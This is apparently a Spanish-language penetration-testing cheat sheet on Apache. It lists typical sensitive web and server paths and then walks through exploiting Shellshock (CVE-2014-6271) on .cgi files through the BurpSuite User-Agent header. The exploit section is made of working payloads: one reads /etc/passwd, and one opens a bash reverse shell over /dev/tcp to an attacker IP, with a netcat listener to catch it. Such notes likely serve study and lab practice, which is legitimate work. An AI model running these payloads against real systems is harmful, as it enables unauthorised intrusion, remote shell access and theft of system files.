# Apache

Tags: #Apache #Servidor #ShellShock #NodeJs 

Apache es un servidor web para el sistema operativo Linux

## Rutas típicas de Apache en la web 

```python
/admin                               # Muestra informacion 'sensible' 
/phpinfo.php                         # Informacion del php

# Rutas en consola 
/var/www/html                        # Ruta de Apache o Nginx
/etc/apache2/sites-enabled/          # Ruta de Apache
/opt/blog/server.js                  # Ruta por default de Node.js
```

## Shellshock (CVE-2014-6271)

* Esta vulnerabilidad la encontramos cuando tenemos un archivo **.cgi**
* Podemos hacer el ataque con BurpSuite.

```bash 
❯ BurpSuiteCommunity &> /dev/null & disown     # Abrimos BurpSuite y lo colocamos en segundo plano, interceptamos el trafico de la web, lo mandamos al Repeater y en la cabecera de 'User-Agent' es donde inyectaremos los comandos.

❯  () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd' # El resultado de los comandos lo veremos en BurpSuite en la parte del Response.

❯ () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/<IP>/443 0>&1' # Este comando lo colocamos en BurpSuite, pero antes de ejecutarlo nos ponemos en escucha con Netcat
❯ nc -nlvp 443    # Nos colocamos en escucha para recibir la ReverShell
 
```



